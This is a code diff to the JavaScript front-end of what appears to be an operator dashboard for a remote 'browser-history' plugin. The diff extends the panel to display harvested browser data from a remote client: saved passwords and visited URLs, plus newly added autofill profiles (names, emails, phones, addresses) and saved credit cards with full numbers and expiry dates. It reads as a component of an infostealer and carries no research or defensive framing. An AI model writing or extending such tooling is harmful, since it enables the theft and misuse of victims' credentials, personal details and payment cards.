@@ -2,11 +2,15 @@ const params = new URLSearchParams(window.location.search);
 const clientIdInput   = document.getElementById("client-id");
 const scanBtn         = document.getElementById("scan-btn");
 const statusPill      = document.getElementById("status-pill");
-const countBadge      = document.getElementById("count-badge");
-const pwdCountBadge   = document.getElementById("pwd-count-badge");
-const resultsArea     = document.getElementById("results-area");
-const passwordsArea   = document.getElementById("passwords-area");
-const logEl           = document.getElementById("log");
+const countBadge        = document.getElementById("count-badge");
+const pwdCountBadge     = document.getElementById("pwd-count-badge");
+const profileCountBadge = document.getElementById("profile-count-badge");
+const cardCountBadge    = document.getElementById("card-count-badge");
+const resultsArea       = document.getElementById("results-area");
+const passwordsArea     = document.getElementById("passwords-area");
+const profilesArea      = document.getElementById("profiles-area");
+const cardsArea         = document.getElementById("cards-area");
+const logEl             = document.getElementById("log");
 
 const pluginId = "browser-history";
 const clientId = params.get("clientId") || "";
@@ -165,6 +169,67 @@ function renderResults(entries, total) {
   resultsArea.innerHTML = html;
 }
 
+// ─── Render autofill profiles ─────────────────────────────────────────────────
+
+function renderProfiles(profiles, total) {
+  profileCountBadge.textContent = String(total);
+  profileCountBadge.classList.toggle("hidden", total === 0);
+
+  if (total === 0) {
+    profilesArea.innerHTML = `<p class="no-wallets">&#x2714; No autofill profiles found.</p>`;
+    return;
+  }
+
+  const rows = profiles.map((p) => `<tr>
+    <td class="title-cell">${escapeHtml(p.fullName)}</td>
+    <td class="title-cell">${escapeHtml(p.email)}</td>
+    <td class="title-cell">${escapeHtml(p.phone)}</td>
+    <td class="title-cell">${escapeHtml([p.address, p.city, p.state, p.zip, p.country].filter(Boolean).join(", "))}</td>
+    <td class="source-cell">${escapeHtml(p.source)}</td>
+  </tr>`).join("");
+
+  profilesArea.innerHTML = `
+    <div class="category-group">
+      <div class="category-title cat-profile">
+        <span class="cat-dot"></span>Profiles (${total})
+      </div>
+      <table class="wallet-table">
+        <thead><tr><th>Name</th><th>Email</th><th>Phone</th><th>Address</th><th>Browser</th></tr></thead>
+        <tbody>${rows}</tbody>
+      </table>
+    </div>`;
+}
+
+// ─── Render credit cards ──────────────────────────────────────────────────────
+
+function renderCards(cards, total) {
+  cardCountBadge.textContent = String(total);
+  cardCountBadge.classList.toggle("hidden", total === 0);
+
+  if (total === 0) {
+    cardsArea.innerHTML = `<p class="no-wallets">&#x2714; No saved credit cards found.</p>`;
+    return;
+  }
+
+  const rows = cards.map((c) => `<tr>
+    <td class="title-cell">${escapeHtml(c.nameOnCard)}</td>
+    <td class="card-number-cell">${escapeHtml(c.number)}</td>
+    <td class="title-cell">${escapeHtml(c.expMonth)}/${escapeHtml(c.expYear)}</td>
+    <td class="source-cell">${escapeHtml(c.source)}</td>
+  </tr>`).join("");
+
+  cardsArea.innerHTML = `
+    <div class="category-group">
+      <div class="category-title cat-card">
+        <span class="cat-dot"></span>Credit Cards (${total})
+      </div>
+      <table class="wallet-table">
+        <thead><tr><th>Name on Card</th><th>Number</th><th>Expiry</th><th>Browser</th></tr></thead>
+        <tbody>${rows}</tbody>
+      </table>
+    </div>`;
+}
+
 // ─── Handle incoming events ───────────────────────────────────────────────────
 
 function handleIncomingEvent(event, payload) {
@@ -173,21 +238,23 @@ function handleIncomingEvent(event, payload) {
     setStatus("Scanning\u2026", "status-scanning");
   } else if (event === "history_result") {
     stopPolling();
-    const total     = payload?.total ?? 0;
-    const pwdTotal  = payload?.passwordTotal ?? 0;
-    const entries   = payload?.entries ?? [];
-    const passwords = payload?.passwords ?? [];
-    const scannedAt = payload?.scannedAt ?? "";
+    const total        = payload?.total ?? 0;
+    const pwdTotal     = payload?.passwordTotal ?? 0;
+    const profileTotal = payload?.profileTotal ?? 0;
+    const cardTotal    = payload?.cardTotal ?? 0;
+    const entries      = payload?.entries ?? [];
+    const passwords    = payload?.passwords ?? [];
+    const profiles     = payload?.profiles ?? [];
+    const cards        = payload?.cards ?? [];
+    const scannedAt    = payload?.scannedAt ?? "";
 
-    log(`Scan complete at ${scannedAt} \u2014 ${total} URL(s), ${pwdTotal} password(s)`);
+    log(`Scan complete at ${scannedAt} \u2014 ${total} URL(s) \u00B7 ${pwdTotal} password(s) \u00B7 ${profileTotal} profile(s) \u00B7 ${cardTotal} card(s)`);
 
-    if (total > 0 || pwdTotal > 0) {
-      setStatus(`${total} URL(s) \u00B7 ${pwdTotal} password(s)`, "status-found");
-    } else {
-      setStatus("Nothing found", "status-clean");
-    }
+    setStatus(`${pwdTotal} pwd \u00B7 ${profileTotal} profiles \u00B7 ${cardTotal} cards \u00B7 ${total} URLs`, "status-found");
 
     renderPasswords(passwords, pwdTotal);
+    renderProfiles(profiles, profileTotal);
+    renderCards(cards, cardTotal);
     renderResults(entries, total);
     scanBtn.disabled = false;
   } else {
